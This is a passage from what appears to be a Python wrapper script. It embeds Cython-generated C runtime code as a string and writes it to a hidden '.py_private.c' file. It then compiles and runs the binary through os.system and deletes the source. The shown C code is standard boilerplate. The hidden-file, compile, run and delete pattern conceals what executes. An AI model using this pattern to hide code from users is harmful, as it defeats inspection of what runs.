                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
    #if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* CheckBinaryVersion */
    static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */'''
C_FILE = ".py_private.c"
PYTHON_VERSION = ".".join(sys.version.split(" ")[0].split(".")[:-1])
COMPILE_FILE = (
    'gcc -I' +
    PREFIX +
    '/include/python' +
    PYTHON_VERSION +
    ' -o ' +
    EXECUTE_FILE +
    ' ' +
    C_FILE +
    ' -L' +
    PREFIX +
    '/lib -lpython' +
    PYTHON_VERSION
)


with open(C_FILE, "w") as f:
    f.write(C_SOURCE)

os.makedirs(os.path.dirname(EXECUTE_FILE), exist_ok=True)
os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+COMPILE_FILE+" && "+RUN)

os.remove(C_FILE)
